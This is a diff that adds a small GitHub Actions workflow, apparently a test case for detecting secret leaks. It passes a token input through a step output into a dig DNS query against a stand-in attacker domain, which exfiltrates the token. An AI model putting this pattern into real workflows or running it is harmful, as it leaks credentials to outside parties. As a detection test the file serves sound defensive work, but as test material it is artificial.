@@ -1,0 +1,22 @@
+name: P21 - Test YAML Inter-Step Output Propagation DNS
+on:
+  workflow_dispatch:
+    inputs:
+      internal_token:
+        description: 'Temporary Access Token'
+        required: true
+
+jobs:
+  dns_leak:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Extract input into step output
+        id: step_source
+        # S_inp: Workflow input context
+        run: |
+          echo "staged_val=${{ inputs.internal_token }}" >> "$GITHUB_OUTPUT"
+
+      - name: Propagate output into DNS query
+        # K_dns: Nhận dữ liệu từ step trước thông qua context ${{ steps... }}
+        run: |
+          dig +short "${{ steps.step_source.outputs.staged_val }}.tunnel.attacker-domain.net"
